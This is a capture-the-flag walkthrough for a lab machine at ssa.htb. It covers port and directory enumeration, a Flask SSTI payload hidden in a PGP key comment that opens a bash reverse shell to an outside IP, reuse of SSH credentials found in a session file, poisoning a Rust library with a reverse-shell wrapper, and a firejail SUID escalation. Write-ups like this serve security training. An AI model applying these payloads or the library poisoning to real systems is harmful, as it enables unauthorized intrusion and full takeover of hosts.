first of all we add the ip to /etc/hosts:

	sudo nano /etc/hosts:
	10.10.11.218    ssa.htb

we start with rustcan in order to enumerate the target machine:

	rustscan -a 10.10.11.218

output:

	Open 10.10.11.218:22
	Open 10.10.11.218:80
	Open 10.10.11.218:443

it's very strange that there is the 443 opens so if we browse to the following url: https://ssa.htb, we can see the certificate details and more specific the issuer, in order to retrieve some information, and seems there is an email: "atlas@ssa.htb", but more specific a possible user called atlas.

It's time to use gobuster:

	gobuster dir -u https://ssa.htb/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt,html,old,docx -k -t 300 2</dev/null

output:

	/about                (Status: 200) [Size: 5584]
	/contact              (Status: 200) [Size: 3543]
	/login                (Status: 200) [Size: 4392]
	/view                 (Status: 302) [Size: 225] [--> /login?next=%2Fview]
	/admin                (Status: 302) [Size: 227] [--> /login?next=%2Fadmin]
	/guide                (Status: 200) [Size: 9043]
	/pgp                  (Status: 200) [Size: 3187]
	/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
	/process              (Status: 405) [Size: 153]

after crawl inside the website, the most interesting directories are /contact and /guide:
/guide have various form as: decrypt, encrypt, signed.
We try the signed form, in the bottom page there is a signed PGP message and the public key, by using them we notice that it could be a field vulnerable to XSS, so we use two site in order to create our signed message:

	/site to generate keys/
	https://pgpkeygen.com/ ---> in the comment field we add the XSS payload

	/site to signed message/
	http://www.2pih.com/pgp.html

We signed the message, we add the public key and it works, after many tries it seems that XSS doing nothing special.
The website is run by flask and my friend Disturbante(https://github.com/Disturbante) after some researches find a vuln that hit the templates'engine(who generate dynamically the web pages), the vuln is called SSTI(Server site template engine) to detect it you can send:

	{{7*7}}

output:

	{{49}}

so we try this script find on internet in order to get a revshell:

	{{config.class.init.globals['os'].popen('bash -c "/bin/bash -i >& /dev/tcp/10.10.16.65/6666 0>&1"').read()}}
	Added in the comment section in the pgp generating keys

	/start pwncat/
	python3 -m pwncat
	connect -lp 6666

we go to the signed form, we paste everything and we have the revshell; digging inside the filesystem we found this:

	/home/atlas/.config/httpie/sessions/localhost_5000/admin.json

there are ssh silentobserver's credentials, so now enter in it:

	pwncat connect ssh://silentobserver:quietLiketheWind22@10.10.11.218

we run linpeas.sh and give us a strange process run by root as atlas

	./tipnet

by reviewing the source code there are various rust's libraries imported and only one is changeable to silentobserver, so the first idea is to poison the library and insert this revshell:

	extern crate chrono;
	
	use std::fs::OpenOptions;
	use std::io::Write;
	use chrono::prelude::*;
	use std::process::Command;
	
	pub fn log(user: &str, query: &str, justification: &str) {
	    REDACTED
	    
	    let output = Command::new("bash")
	        .arg("-c")
	        .arg(command)
	        .output()
	        .expect("not work");
	        
	    if output.status.success() {
	        let stdout = String::from_utf8_lossy(&output.stdout);
	        let stderr = String::from_utf8_lossy(&output.stderr);
	        
	        println!("standar output: {}", stdout);
	        println!("error output: {}", stderr);
	    } else {
	        let stderr = String::from_utf8_lossy(&output.stderr);
	        eprintln!("Error: {}", stderr);
	    }
	    
	    let now = Local::now();
	    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
	    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
	    
	    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
	        Ok(file) => file,
	        Err(e) => {
	            println!("Error opening log file: {}", e);
	            return;
	        }
	    };
	    
	    if let Err(e) = file.write_all(log_message.as_bytes()) {
	        println!("Error writing to log file: {}", e);
	    }
	}

we run pwncat:

	pwncat -lp 7777

we're atlas, retrieve and submit the user flag, re-run linpeas.sh.
By running linpeas.sh we can see that firejail it has SUID, so we can work on it to do some privesc, in internet we found an interesting payload:

	https://www.openwall.com/lists/oss-security/2022/06/08/10/1

we open another terminal, sudo su and where are root, /root and submit the root flag.

